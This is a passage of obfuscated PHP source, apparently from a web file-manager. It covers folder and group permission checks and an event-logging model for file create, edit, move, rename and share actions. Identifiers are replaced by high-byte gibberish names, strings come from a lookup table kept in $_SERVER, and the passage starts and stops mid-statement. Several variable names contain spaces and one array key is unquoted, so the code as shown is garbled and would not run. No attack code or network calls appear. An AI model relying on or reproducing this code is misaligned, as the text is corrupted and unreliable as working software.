explode($âÎñ¿¡©[50], trim($ƒÂĞÙ”Æ[$âÎñ¿¡©[512]], $âÎñ¿¡©[50])); $¿¨–ê = array_reverse($¿¨–ê); foreach ($¿¨–ê as $Çé’Šƒ) { if ($Çé’Šƒ == $âÎñ¿¡©[190] || $Çé’Šƒ == $ŠÖûˆõğ) { continue; } $Ç«òúÛ† = $this->groupRootAuth($Çé’Šƒ, $È‰‰—¢ü); if (!$Ç«òúÛ†) { continue; } $Î§Š¸Ãí = $this->groupAuthInfo($Ç«òúÛ†, $Çé’Šƒ); break; } } if (!$Î§Š¸Ãí || $Î§Š¸Ãí[$âÎñ¿¡©[406]] <= 0) { $Ùœ¡Ããã = $this->authDeepCheck($®ÍÌ©‚×[$âÎñ¿¡©[394]], $È‰‰—¢ü); if ($Ùœ¡Ããã) { $Î§Š¸Ãí = $Ùœ¡Ããã; } } return $Î§Š¸Ãí; } private function userIsRoot($â›ó¸µ¹ = false) { $«şÔ»ÙÖ =& $_SERVER[® ¨Ä®ñ]; if (!$â›ó¸µ¹ && _get($GLOBALS, $«şÔ»ÙÖ[496])) { return !0; } $‘ş¢ËÃ¡ = Model($«şÔ»ÙÖ[529])->getInfo($â›ó¸µ¹); $ö–£¸â® = Model($«şÔ»ÙÖ[1999])->listData($‘ş¢ËÃ¡[$«şÔ»ÙÖ[1519]]); if ($ö–£¸â® && $ö–£¸â®[$«şÔ»ÙÖ[502]][$«şÔ»ÙÖ[2000]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ç®âÇäë) { $âÆ¢§»à =& $_SERVER[® ¨Ä®ñ]; $‰Í¯ƒ´ = Model($âÆ¢§»à[1309]); $à«æ¿Ş = $‰Í¯ƒ´->sourceInfo($ç®âÇäë); if (!$à«æ¿Ş) { return !1; } $‰Í¯ƒ´->groupPathDisplay($à«æ¿Ş); $Ì®ŒØ¸ = array($à«æ¿Ş); $Ì®ŒØ¸ = $‰Í¯ƒ´->_listAppendPath($Ì®ŒØ¸); $à«æ¿Ş = $Ì®ŒØ¸[0]; $Óµ¯Úë¦ = $à«æ¿Ş[$âÆ¢§»à[510]]; if (isset($à«æ¿Ş[$âÆ¢§»à[518]])) { $î¡¸Ù¼ = explode($âÆ¢§»à[8], trim($à«æ¿Ş[$âÆ¢§»à[510]], $âÆ¢§»à[8])); array_shift($î¡¸Ù¼); $Óµ¯Úë¦ = $à«æ¿Ş[$âÆ¢§»à[516]] . $âÆ¢§»à[2001] . implode($âÆ¢§»à[8], $î¡¸Ù¼); } return array($âÆ¢§»à[412] => $à«æ¿Ş[$âÆ¢§»à[32]], $âÆ¢§»à[78] => KodIO::make($à«æ¿Ş[$âÆ¢§»à[394]]), $âÆ¢§»à[2002] => $Óµ¯Úë¦); } private function groupAuthInfo($‚£“Õâ­, $†İ¿Ø–) { $§¨Õ¡Æ =& $_SERVER[® ¨Ä®ñ]; $Âò¼ØŸ³ = Model($§¨Õ¡Æ[513])->getInfo($†İ¿Ø–); return array($§¨Õ¡Æ[2003] => intval($‚£“Õâ­[$§¨Õ¡Æ[405]]), $§¨Õ¡Æ[1987] => $‚£“Õâ­, $§¨Õ¡Æ[2004] => LNG($§¨Õ¡Æ[2005]), $§¨Õ¡Æ[1996] => array($§¨Õ¡Æ[412] => $Âò¼ØŸ³[$§¨Õ¡Æ[32]], $§¨Õ¡Æ[78] => KodIO::make($Âò¼ØŸ³[$§¨Õ¡Æ[87]][$§¨Õ¡Æ[394]]), $§¨Õ¡Æ[2002] => $Âò¼ØŸ³[$§¨Õ¡Æ[517]])); } protected function groupRootAuth($¯˜ı¥„¦, $ŒÒ œêô = false) { $îÏ¼´Œò =& $_SERVER[® ¨Ä®ñ]; $ŒÒ œêô = $ŒÒ œêô ? $ŒÒ œêô : USER_ID; $ÌÇ÷Ÿó¾ = $ŒÒ œêô . $îÏ¼´Œò[2006] . $¯˜ı¥„¦; static $º÷Ñò£ˆ = array(); if (isset($º÷Ñò£ˆ[$ÌÇ÷Ÿó¾])) { return $º÷Ñò£ˆ[$ÌÇ÷Ÿó¾]; } $«ŞêÕ°ó = Model($îÏ¼´Œò[513])->getInfo($¯˜ı¥„¦); $„ÜÜ¯¼ı = $this->userGroupList($ŒÒ œêô); $««–¹Æé = isset($„ÜÜ¯¼ı[$¯˜ı¥„¦]) ? $„ÜÜ¯¼ı[$¯˜ı¥„¦][$îÏ¼´Œò[405]] : !1; if ($««–¹Æé && Model($îÏ¼´Œò[498])->authCheckAction($««–¹Æé[$îÏ¼´Œò[405]], $îÏ¼´Œò[1827])) { $º÷Ñò£ˆ[$ÌÇ÷Ÿó¾] = $««–¹Æé; return $««–¹Æé; } $ÜÓí¸Ùá = $this->sourceAuthSelect($«ŞêÕ°ó[$îÏ¼´Œò[87]][$îÏ¼´Œò[394]]); $ç¨§üø‚ = $ÜÓí¸Ùá ? $this->authMake($ÜÓí¸Ùá, $ŒÒ œêô) : !1; $¾©Ç¯È® = $ç¨§üø‚ ? $ç¨§üø‚[$îÏ¼´Œò[457]] : !1; $º÷Ñò£ˆ[$ÌÇ÷Ÿó¾] = $¾©Ç¯È® ? $¾©Ç¯È® : $««–¹Æé; return $º÷Ñò£ˆ[$ÌÇ÷Ÿó¾]; } public function authOwnerApply($É†¡¹‹) { $ÙÎ¤ã»º =& $_SERVER[® ¨Ä®ñ]; if (empty($É†¡¹‹[$ÙÎ¤ã»º[405]]) || isset($É†¡¹‹[$ÙÎ¤ã»º[2007]]) && $É†¡¹‹[$ÙÎ¤ã»º[2007]]) { return $É†¡¹‹; } if (AuthModel::authCheckRoot($É†¡¹‹[$ÙÎ¤ã»º[405]][$ÙÎ¤ã»º[406]])) { return $É†¡¹‹; } $ê˜¥ÁûÖ = Model($ÙÎ¤ã»º[1309])->parentLevelArray($É†¡¹‹[$ÙÎ¤ã»º[512]]); $ê˜¥ÁûÖ = array_merge(array($É†¡¹‹[$ÙÎ¤ã»º[394]]), array_reverse($ê˜¥ÁûÖ)); $²ŸìÔ»¨ = $this->sourceAuthSelect($ê˜¥ÁûÖ); $™®ÜË¹ñ = array(); $éûß«ıÒ = array(); foreach ($²ŸìÔ»¨ as $Ë™­ê³€ => $Šá±§İŠ) { $­Ç©®â› = $this->authFolderOwnerUser($Šá±§İŠ); $™®ÜË¹ñ[$Ë™­ê³€] = $­Ç©®â›; $éûß«ıÒ = array_merge($éûß«ıÒ, $­Ç©®â›[$ÙÎ¤ã»º[585]]); if ($­Ç©®â›[$ÙÎ¤ã»º[2008]]) { break; } } if (count($éûß«ıÒ) == 0) { $éûß«ıÒ = $this->authFolderOwnerGroup($É†¡¹‹[$ÙÎ¤ã»º[495]]); } $éûß«ıÒ = array_unique($éûß«ıÒ); if (AuthModel::authCheckRoot($É†¡¹‹[$ÙÎ¤ã»º[405]][$ÙÎ¤ã»º[406]])) { $éûß«ıÒ[] = USER_ID; } $É†¡¹‹[$ÙÎ¤ã»º[405]][$ÙÎ¤ã»º[2009]] = Model($ÙÎ¤ã»º[504])->userListInfo($éûß«ıÒ); return $É†¡¹‹; } private function authFolderOwnerGroup($×ÃáÉ–±) { $¿¿é”×Ø =& $_SERVER[® ¨Ä®ñ]; $‹”‘ÇÙá = Model($¿¿é”×Ø[1896])->where(array($¿¿é”×Ø[1807] => $×ÃáÉ–±))->select(); $¾úŒÌ‡ = array(); if (!$‹”‘ÇÙá) { return $¾úŒÌ‡; } foreach ($‹”‘ÇÙá as $«ÙˆÍã°) { $£á×±¸Æ = $this->authInfo($«ÙˆÍã°); if (AuthModel::authCheckRoot($£á×±¸Æ[$¿¿é”×Ø[405]])) { $¾úŒÌ‡[] = $«ÙˆÍã°[$¿¿é”×Ø[1639]]; } } return $¾úŒÌ‡; } private function authFolderOwnerUser($šóêÄñØ) { $ˆÁ£Ñ¤ =& $_SERVER[® ¨Ä®ñ]; $¥Ş”®Û‡ = array(); $Ü·œ’Â = !1; foreach ($šóêÄñØ as $úœª¡÷Ì) { $„‡ÊÉö = $this->authInfo($úœª¡÷Ì); if ($úœª¡÷Ì[$ˆÁ£Ñ¤[495]] == $ˆÁ£Ñ¤[190]) { $Ü·œ’Â = !0; } if ($úœª¡÷Ì[$ˆÁ£Ñ¤[403]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($„‡ÊÉö[$ˆÁ£Ñ¤[405]])) { $¥Ş”®Û‡[] = $úœª¡÷Ì[$ˆÁ£Ñ¤[495]]; } } } return array($ˆÁ£Ñ¤[585] => $¥Ş”®Û‡, $ˆÁ£Ñ¤[2008] => $Ü·œ’Â); } public function authMake($öÍ–Ó°±, $Ë”ë£ÍŒ = false) { $œÓõ±‚ =& $_SERVER[® ¨Ä®ñ]; $û¾Ã²Ø· = $this->authArrayCheck($öÍ–Ó°±, $Ë”ë£ÍŒ); if ($û¾Ã²Ø·[$œÓõ±‚[2010]]) { $û¾Ã²Ø·[$œÓõ±‚[2010]] = $this->sourceAuthInfo($û¾Ã²Ø·[$œÓõ±‚[2010]]); } return $û¾Ã²Ø·; } public function authArrayCheck($Ãş­Ëüê, $á—£³ú = false) { $ë²™ò» =& $_SERVER[® ¨Ä®ñ]; if (!$Ãş­Ëüê) { return array($ë²™ò»[406] => 0, $ë²™ò»[457] => !1); } $á—£³ú = $á—£³ú ? $á—£³ú : USER_ID; $ÈÚ¦ÆÅ = 0; $Ä§‚Š¾Í = 0; $õë€¥Â = 0; $µñ’»†À = 0; $Á—Ã»¯ = 0; $öİ…¶¤Ì = 0; $‘éÄÔ·õ = 1000; $åÍ˜ŠØ = 0; $å¦Ñ²ı“ = 0; $üŠ¸å³Š = 0; $ÈÈ‹î©Â = 0; $á¹­óŠº = array($ë²™ò»[394] => 0); foreach ($Ãş­Ëüê as $á¹­óŠº) { $Úâá§ğ† = $this->authInfo($á¹­óŠº); if (!$Úâá§ğ†) { continue; } $ê‰×ü¨ = $á¹­óŠº[$ë²™ò»[495]]; $Ìİşü¯’ = intval($Úâá§ğ†[$ë²™ò»[405]]); if ($á¹­óŠº[$ë²™ò»[403]] == SourceModel::TYPE_USER && $ê‰×ü¨ == $á—£³ú) { $ÈÚ¦ÆÅ = !0; $õë€¥Â = $Úâá§ğ†; $Ä§‚Š¾Í = $Ìİşü¯’; } else { if ($á¹­óŠº[$ë²™ò»[403]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ê‰×ü¨, $á—£³ú)) { $µñ’»†À = !0; $§²áù¥ì = $this->groupStepToUserGroup($ê‰×ü¨, $á—£³ú); if ($§²áù¥ì < $‘éÄÔ·õ) { $‘éÄÔ·õ = $§²áù¥ì; $Á—Ã»¯ = $Ìİşü¯’; $öİ…¶¤Ì = $Úâá§ğ†; $åÍ˜ŠØ = $ê‰×ü¨; } if ($§²áù¥ì == $‘éÄÔ·õ && $Ìİşü¯’ >= $Á—Ã»¯) { $Á—Ã»¯ = $Ìİşü¯’; $öİ…¶¤Ì = $Úâá§ğ†; $åÍ˜ŠØ = $ê‰×ü¨; } } else { if ($ê‰×ü¨ == $ë²™ò»[190]) { $å¦Ñ²ı“ = !0; $ÈÈ‹î©Â = $Úâá§ğ†; $üŠ¸å³Š = $Ìİşü¯’; } } } } if ($ÈÚ¦ÆÅ) { $Íœ°Ó² = $Ä§‚Š¾Í; $Úâá§ğ† = $õë€¥Â; $éàÕÅşÒ = LNG($ë²™ò»[2011]); } else { if ($µñ’»†À) { $Íœ°Ó² = $Á—Ã»¯; $Úâá§ğ† = $öİ…¶¤Ì; $ì²Ÿ«‚Ø = Model($ë²™ò»[513])->getInfo($åÍ˜ŠØ); $éàÕÅşÒ = $ë²™ò»[159] . $ì²Ÿ«‚Ø[$ë²™ò»[517]] . $ë²™ò»[2012] . LNG($ë²™ò»[2013]); } else { if ($å¦Ñ²ı“) { $Íœ°Ó² = $üŠ¸å³Š; $Úâá§ğ† = $ÈÈ‹î©Â; $éàÕÅşÒ = LNG($ë²™ò»[1984]); } else { $Íœ°Ó² = 0; $Úâá§ğ† = !1; $éàÕÅşÒ = $ë²™ò»[12]; } } } $şÊšãÆ‡ = array($ë²™ò»[2003] => intval($Íœ°Ó²), $ë²™ò»[1987] => $Úâá§ğ†, $ë²™ò»[2004] => $éàÕÅşÒ, $ë²™ò»[1996] => $á¹­óŠº[$ë²™ò»[394]]); return $şÊšãÆ‡; } private function groupContainUser($ŒÍÅ¢ò, $–âïãĞ = false) { return in_array($ŒÍÅ¢ò, $this->userGroupParents($–âïãĞ)); } private function groupStepToUserGroup($ı®²µ‡Š, $ëîş¹÷ = false) { $áñÅã“« =& $_SERVER[® ¨Ä®ñ]; $»ãÕÓó = $this->userGroupList($ëîş¹÷); $ò¤”öë… = 1000; $‘­¦Â– = $GLOBALS[$áñÅã“«[6]][$áñÅã“«[90]][$áñÅã“«[1907]] == 1; $…½É‰Ùá = $‘­¦Â– ? 3 : 2; foreach ($»ãÕÓó as $àßŞÖ÷«) { if ($àßŞÖ÷«[$áñÅã“«[1807]] == $ı®²µ‡Š) { return 0; } $ˆÎ‰í´ = explode($áñÅã“«[50], trim($àßŞÖ÷«[$áñÅã“«[512]], $áñÅã“«[50])); if ($ˆÎ‰í´[0] == $áñÅã“«[190] && count($ˆÎ‰í´) > $…½É‰Ùá) { $šŸŒè‹¾ = array_reverse(array_slice($ˆÎ‰í´, $…½É‰Ùá)); $®‡•›Õ = array_search($ı®²µ‡Š, $šŸŒè‹¾); if ($®‡•›Õ !== !1 && $®‡•›Õ + 1 <= $ò¤”öë…) { $ò¤”öë… = $®‡•›Õ + 1; } } } return $ò¤”öë…; } private function userGroupList($‡ãá­šÄ = false) { $¥’§¯°ç =& $_SERVER[® ¨Ä®ñ]; static $¼˜ÃôĞ = array(); if (isset($¼˜ÃôĞ[$‡ãá­šÄ])) { return $¼˜ÃôĞ[$‡ãá­šÄ]; } $â¤£ç÷Ç = Model($¥’§¯°ç[529])->getInfo($‡ãá­šÄ); $¼˜ÃôĞ[$‡ãá­šÄ] = array_to_keyvalue($â¤£ç÷Ç[$¥’§¯°ç[1985]], $¥’§¯°ç[1807]); return $¼˜ÃôĞ[$‡ãá­šÄ]; } public function userGroupParents($¡ª‹«ç) { $ÒÚ·ˆ§› =& $_SERVER[® ¨Ä®ñ]; static $™Ö–åÙ‰ = array(); $¡ª‹«ç = $¡ª‹«ç ? $¡ª‹«ç : USER_ID; if (isset($™Ö–åÙ‰[$¡ª‹«ç])) { return $™Ö–åÙ‰[$¡ª‹«ç]; } $»³Œ¤û = $this->userGroupList($¡ª‹«ç); $ï±Ïè¾ã = array(); $ĞÙü¹§Ã = $GLOBALS[$ÒÚ·ˆ§›[6]][$ÒÚ·ˆ§›[90]][$ÒÚ·ˆ§›[1907]] == 1; $ö’¿ß½á = $ĞÙü¹§Ã ? 3 : 2; foreach ($»³Œ¤û as $Ûà¾ÊŠ) { $Ú¶¶şıÅ = array($Ûà¾ÊŠ[$ÒÚ·ˆ§›[1807]]); $™ó¹¡Â = explode($ÒÚ·ˆ§›[50], trim($Ûà¾ÊŠ[$ÒÚ·ˆ§›[512]], $ÒÚ·ˆ§›[50])); if ($™ó¹¡Â[0] == $ÒÚ·ˆ§›[190] && count($™ó¹¡Â) > $ö’¿ß½á) { $ˆáà‚÷² = array_slice($™ó¹¡Â, $ö’¿ß½á); $Ú¶¶şıÅ = array_merge($Ú¶¶şıÅ, array_reverse($ˆáà‚÷²)); } $ï±Ïè¾ã = array_merge($ï±Ïè¾ã, $Ú¶¶şıÅ); } $™Ö–åÙ‰[$¡ª‹«ç] = array_unique($ï±Ïè¾ã); return $™Ö–åÙ‰[$¡ª‹«ç]; } public function authTargetInfoMake($™ì¾Úâ”) { $…ËŠİ…Á =& $_SERVER[® ¨Ä®ñ]; $‹Ïßßùè = array(); $ˆæ‹ï‹£ = array(); foreach ($™ì¾Úâ” as $ÎÇ æ‘…) { if ($ÎÇ æ‘…[$…ËŠİ…Á[403]] == SourceModel::TYPE_USER) { $‹Ïßßùè[] = intval($ÎÇ æ‘…[$…ËŠİ…Á[495]]); } else { if ($ÎÇ æ‘…[$…ËŠİ…Á[403]] == SourceModel::TYPE_GROUP) { $ˆæ‹ï‹£[] = intval($ÎÇ æ‘…[$…ËŠİ…Á[495]]); } } } if ($‹Ïßßùè) { $‹Ïßßùè = Model($…ËŠİ…Á[504])->userListInfo($‹Ïßßùè); } if ($ˆæ‹ï‹£) { $…ÆÚôùÂ = array($…ËŠİ…Á[1894] => array($…ËŠİ…Á[410], $ˆæ‹ï‹£)); $ˆæ‹ï‹£ = Model($…ËŠİ…Á[513])->field($…ËŠİ…Á[2014])->where($…ÆÚôùÂ)->select(); $ˆæ‹ï‹£ = array_to_keyvalue($ˆæ‹ï‹£, $…ËŠİ…Á[1807]); } return array($…ËŠİ…Á[2015] => $‹Ïßßùè, $…ËŠİ…Á[2016] => $ˆæ‹ï‹£); } public function authInfo($«çºÔ‡²) { $åşƒŠãå =& $_SERVER[® ¨Ä®ñ]; if ($«çºÔ‡²[$åşƒŠãå[1908]]) { $Ü‰‹©² = Model($åşƒŠãå[498])->listData($«çºÔ‡²[$åşƒŠãå[1908]]); if (!$Ü‰‹©²) { return !1; $üú±° = Model($åşƒŠãå[498])->listData(); $Î²±Ä·Ü = array_filter_by_field($üú±°, $åşƒŠãå[405], $åşƒŠãå[190]); return $Î²±Ä·Ü; } $½ıå¹™Ú = array_field_key($Ü‰‹©², array($åşƒŠãå[392], $åşƒŠãå[32], $åşƒŠãå[405], $åşƒŠãå[1829], $åşƒŠãå[1830])); $½ıå¹™Ú[$åşƒŠãå[2017]] = $«çºÔ‡²; return $½ıå¹™Ú; } else { return array($åşƒŠãå[411] => 0, $åşƒŠãå[1813] => $«çºÔ‡²[$åşƒŠãå[1962]], $åşƒŠãå[412] => $åşƒŠãå[12], $åşƒŠãå[1829] => $åşƒŠãå[2018]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\162\x63\145\137\x65\166\x65\156\164"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\124\151\155\145", "\164\151\x6d\x65", "\x69\156\x73\145\162\x74", "\146\x75\x6e\143\164\151\x6f\x6e"), array("\144\x65\163\x63", '', "\151\x6e\x73\x65\162\x74\x2c\165\x70\144\141\164\145\x2c\x73\145\154\x65\x63\x74", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¸å¡öÁ†, $İç’æŞ, $„‹¼¯½Ù = '') { $£ªå‡´¿ =& $_SERVER[® ¨Ä®ñ]; if (!$this->eventSave) { return; } $åËü–£š = Model($£ªå‡´¿[1309])->sourceInfo($¸å¡öÁ†); if (!$åËü–£š) { return !1; } if ($this->isCacheEvent($åËü–£š, $İç’æŞ)) { return; } if ($„‹¼¯½Ù && is_string($„‹¼¯½Ù)) { $„‹¼¯½Ù = array($£ªå‡´¿[1845] => $„‹¼¯½Ù); } $„¶ü²ØÌ = array($£ªå‡´¿[409] => $¸å¡öÁ†, $£ªå‡´¿[2019] => $åËü–£š[$£ªå‡´¿[489]], $£ªå‡´¿[2020] => $åËü–£š[$£ªå‡´¿[32]], $£ªå‡´¿[510] => !empty($åËü–£š[$£ªå‡´¿[510]]) ? $åËü–£š[$£ªå‡´¿[510]] : $£ªå‡´¿[12], $£ªå‡´¿[1630] => USER_ID, $£ªå‡´¿[414] => $İç’æŞ, $£ªå‡´¿[1632] => $„‹¼¯½Ù); $this->addSystemLog($İç’æŞ, $„¶ü²ØÌ); unset($„¶ü²ØÌ[$£ªå‡´¿[2020]], $„¶ü²ØÌ[$£ªå‡´¿[510]]); return $this->add($„¶ü²ØÌ); } private function addSystemLog($üùáñÃ³, $ĞÇô…ó) { $½ëîÆ¢Û =& $_SERVER[® ¨Ä®ñ]; if ($üùáñÃ³ == $½ëîÆ¢Û[2021]) { $üùáñÃ³ = $ĞÇô…ó[$½ëîÆ¢Û[442]][$½ëîÆ¢Û[2022]]; } else { if (in_array($üùáñÃ³, array($½ëîÆ¢Û[1787], $½ëîÆ¢Û[2023]))) { $üùáñÃ³ = $ĞÇô…ó[$½ëîÆ¢Û[442]][$½ëîÆ¢Û[737]]; } } $Ê½Ğ²‚º = array_merge($ĞÇô…ó, array($½ëîÆ¢Û[2024] => $ĞÇô…ó[$½ëîÆ¢Û[394]], $½ëîÆ¢Û[2025] => $ĞÇô…ó[$½ëîÆ¢Û[2025]])); Hook::trigger($½ëîÆ¢Û[2026], $½ëîÆ¢Û[2027] . $üùáñÃ³, $ĞÇô…ó); Model($½ëîÆ¢Û[1751])->addLog($½ëîÆ¢Û[2027] . $üùáñÃ³, $Ê½Ğ²‚º); } private function isCacheEvent($şé¤à, $Ñ«ªâŠ) { if ($şé¤à[$_SERVER[® ¨Ä®ñ][403]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Øªà¾´», $»èÆÃ¤ş) { $…İ¿Òî« =& $_SERVER[® ¨Ä®ñ]; $­”Ş²˜Ì = Model($…İ¿Òî«[1309])->sourceInfo($Øªà¾´»); $Ã’´¥åØ = array($…İ¿Òî«[2022] => $»èÆÃ¤ş, $…İ¿Òî«[32] => $­”Ş²˜Ì[$…İ¿Òî«[32]]); return $this->addEvent($Øªà¾´», $…İ¿Òî«[2021], $Ã’´¥åØ); } public function eventFileEdit($êĞˆ¦Ô†) { $­ÚâŒğ¸ =& $_SERVER[® ¨Ä®ñ]; $Ÿ…•ŸÄÇ = array($­ÚâŒğ¸[2028] => $_SERVER[$­ÚâŒğ¸[2029]], $­ÚâŒğ¸[2030] => strtolower(ACTION)); return $this->addEvent($êĞˆ¦Ô†, $­ÚâŒğ¸[1777], $Ÿ…•ŸÄÇ); } public function eventRecycle($î­ÉØ×, $€ÁŸ—Ê£) { return $this->addEvent($î­ÉØ×, $_SERVER[® ¨Ä®ñ][2023], $€ÁŸ—Ê£); } public function eventRemove($¥Ñ»…³µ) { $ê¸¶õÛß =& $_SERVER[® ¨Ä®ñ]; $ñè·Ìè¢ = Model($ê¸¶õÛß[1309])->sourceInfo($¥Ñ»…³µ); $¿óğ½ß¯ = $ñè·Ìè¢[$ê¸¶õÛß[32]]; return $this->addEvent($ñè·Ìè¢[$ê¸¶õÛß[489]], $ê¸¶õÛß[1776], $¿óğ½ß¯); } public function eventShare($ÏùÌĞ²¬, $ªñèÌÂ¾) { return $this->addEvent($ÏùÌĞ²¬, $_SERVER[® ¨Ä®ñ][1787], $ªñèÌÂ¾); } public function eventMove($ˆ“·ÉÒ‡, $°´³”î“, $ˆ¬àº) { $Òª‚ñìß =& $_SERVER[® ¨Ä®ñ]; $€¯€¿Ôğ = Model($Òª‚ñìß[1309]); $€€Õ™‚• = $€¯€¿Ôğ->sourceInfo($ˆ“·ÉÒ‡); $œÛ‘§‘­ = $€¯€¿Ôğ->sourceInfo($°´³”î“); $ÕÛÂäèÌ = $€¯€¿Ôğ->sourceInfo($ˆ¬àº); $ˆç¾‰ = array($Òª‚ñìß[1142] => $°´³”î“, $Òª‚ñìß[2031] => $œÛ‘§‘­[$Òª‚ñìß[32]], $Òª‚ñìß[2010] => !empty($œÛ‘§‘­[$Òª‚ñìß[510]]) ? $œÛ‘§‘­[$Òª‚ñìß[510]] : $Òª‚ñìß[12], $Òª‚ñìß[1143] => $ˆ¬àº, $Òª‚ñìß[2032] => $ÕÛÂäèÌ[$Òª‚ñìß[32]], $Òª‚ñìß[2033] => !empty($ÕÛÂäèÌ[$Òª‚ñìß[510]]) ? $ÕÛÂäèÌ[$Òª‚ñìß[510]] : $Òª‚ñìß[12]); $this->addEvent($ˆ“·ÉÒ‡, $Òª‚ñìß[542], $ˆç¾‰); $€€Õ™‚• = $€¯€¿Ôğ->sourceInfo($ˆ“·ÉÒ‡); $ˆç¾‰ = array($Òª‚ñìß[394] => $€€Õ™‚•[$Òª‚ñìß[394]], $Òª‚ñìß[32] => $€€Õ™‚•[$Òª‚ñìß[32]]); $this->addEvent($°´³”î“, $Òª‚ñìß[2034], $ˆç¾‰); } public function eventCopy($ü¿ƒÅö) { $this->eventCreate($ü¿ƒÅö, $_SERVER[® ¨Ä®ñ][540]); } public function eventRename($í«íİÖ×, $¨ç“­€, $¤‹íŒùô) { $–”ù®¤õ =& $_SERVER[® ¨Ä®ñ]; $¢Œú¼‰… = array($–”ù®¤õ[1142] => $¨ç“­€, $–”ù®¤õ[1143] => $¤‹íŒùô); return $this->addEvent($í«íİÖ×, $–”ù®¤õ[1324], $¢Œú¼‰…); } public function eventAddComment($ƒ²—ñ¯‰, $ãÚÙª¥) { return $this->addEvent($ƒ²—ñ¯‰, $_SERVER[® ¨Ä®ñ][2035], $ãÚÙª¥); } public function eventAddDesc($ñâ–âø , $¢‰ÏóÉè) { return $this->addEvent($ñâ–âø , $_SERVER[® ¨Ä®ñ][2036], $¢‰ÏóÉè); } public function listBySource($Óá‰Î‰) { $à½ÆÈÚ› =& $_SERVER[® ¨Ä®ñ]; $ ±ã ® = Model($à½ÆÈÚ›[1309])->sourceInfo($Óá‰Î‰); $ŒêÃÏ‰à = array($à½ÆÈÚ›[409] => $Óá‰Î‰); if ($ ±ã ®[$à½ÆÈÚ›[402]] == $à½ÆÈÚ›[89]) { $ªÆ¹´ø÷ = Model($à½ÆÈÚ›[1309])->listSearchChildren($Óá‰Î‰, 20000); $ªÆ¹´ø÷[] = $Óá‰Î‰ . $à½ÆÈÚ›[373]; $ŒêÃÏ‰à = array($à½ÆÈÚ›[394] => array($à½ÆÈÚ›[7], $ªÆ¹´ø÷)); } $¬ãú«¤ = $this->where($ŒêÃÏ‰à)->order($à½ÆÈÚ›[2037])->selectPage(); if ($¬ãú«¤[$à½ÆÈÚ›[361]][$à½ÆÈÚ›[362]] == 0) { $¬ãú«¤[$à½ÆÈÚ›[361]][$à½ÆÈÚ›[362]] = 1; $¬ãú«¤[$à½ÆÈÚ›[364]] = array(array($à½ÆÈÚ›[409] => $Óá‰Î‰, $à½ÆÈÚ›[2019] => $ ±ã ®[$à½ÆÈÚ›[489]], $à½ÆÈÚ›[1630] => $ ±ã ®[$à½ÆÈÚ›[443]], $à½ÆÈÚ›[414] => $à½ÆÈÚ›[2038], $à½ÆÈÚ›[415] => $ ±ã ®[$à½ÆÈÚ›[193]], $à½ÆÈÚ›[1632] => $à½ÆÈÚ›[12])); } return $this->eventListParse($¬ãú«¤, $Óá‰Î‰); } private function eventListParse($ˆÆß®ÑÎ, $ßÉ•š¤ò) { $£¥‘òÊÊ =& $_SERVER[® ¨Ä®ñ]; $—²±’é = $ˆÆß®ÑÎ[$£¥‘òÊÊ[364]]; $ªëÖõõ = array_to_keyvalue($—²±’é, $£¥‘òÊÊ[12], $£¥‘òÊÊ[394]); $è¡±ĞĞ£ = array_to_keyvalue($—²±’é, $£¥‘òÊÊ[12], $£¥‘òÊÊ[2025]); foreach ($—²±’é as $ºœÇºÃ») { $­©©íÊ = $ºœÇºÃ»[$£¥‘òÊÊ[442]]; if ($ºœÇºÃ»[$£¥‘òÊÊ[33]] == $£¥‘òÊÊ[542] && isset($­©©íÊ[$£¥‘òÊÊ[1142]])) { $ªëÖõõ[] = $­©©íÊ[$£¥‘òÊÊ[1142]] . $£¥‘òÊÊ[12]; $ªëÖõõ[] = $­©©íÊ[$£¥‘òÊÊ[1143]] . $£¥‘òÊÊ[12]; } if ($ºœÇºÃ»[$£¥‘òÊÊ[33]] == $£¥‘òÊÊ[2034] && isset($­©©íÊ[$£¥‘òÊÊ[394]])) { $ªëÖõõ[] = $­©©íÊ[$£¥‘òÊÊ[394]] . $£¥‘òÊÊ[12]; } } $ªëÖõõ = array_merge($ªëÖõõ, $è¡±ĞĞ£, array($ßÉ•š¤ò . $£¥‘òÊÊ[12])); $ªëÖõõ = array_unique($ªëÖõõ); $ª•„üÙ÷ = array_unique(array_to_keyvalue($—²±’é, $£¥‘òÊÊ[12], $£¥‘òÊÊ[1639])); $Ø®úø…­ = Model($£¥‘òÊÊ[529])->userListInfo($ª•„üÙ÷); $„ñªÕ = Model($£¥‘òÊÊ[807])->sourceListInfo($ªëÖõõ, !0); foreach ($—²±’é as &$ºœÇºÃ») { if ($ºœÇºÃ»[$£¥‘òÊÊ[33]] == $£¥‘òÊÊ[542] && isset($ºœÇºÃ»[$£¥‘òÊÊ[442]][$£¥‘òÊÊ[1142]])) { $ºœÇºÃ»[$£¥‘òÊÊ[442]][$£¥‘òÊÊ[1142]] = $„ñªÕ[$ºœÇºÃ»[$£¥‘òÊÊ[442]][$£¥‘òÊÊ[1142]]]; $ºœÇºÃ»[$£¥‘òÊÊ[442]][$£¥‘òÊÊ[1143]] = $„ñªÕ[$ºœÇºÃ»[$£¥‘òÊÊ[442]][$£¥‘òÊÊ[1143]]]; } if ($ºœÇºÃ»[$£¥‘òÊÊ[33]] == $£¥‘òÊÊ[2034] && isset($ºœÇºÃ»[$£¥‘òÊÊ[442]][$£¥‘òÊÊ[394]])) { $ºœÇºÃ»[$£¥‘òÊÊ[442]][$£¥‘òÊÊ[394]] = $„ñªÕ[$ºœÇºÃ»[$£¥‘òÊÊ[442]][$£¥‘òÊÊ[394]]]; } $ºœÇºÃ»[$£¥‘òÊÊ[87]] = $„ñªÕ[$ºœÇºÃ»[$£¥‘òÊÊ[394]]]; $ºœÇºÃ»[$£¥‘òÊÊ[2039]] = $„ñªÕ[$ºœÇºÃ»[$£¥‘òÊÊ[2025]]]; if ($ºœÇºÃ»[$£¥‘òÊÊ[33]] == $£¥‘òÊÊ[1776]) { $ºœÇºÃ»[$£¥‘òÊÊ[2039]] = $ºœÇºÃ»[$£¥‘òÊÊ[87]]; $ºœÇºÃ»[$£¥‘òÊÊ[2025]] = 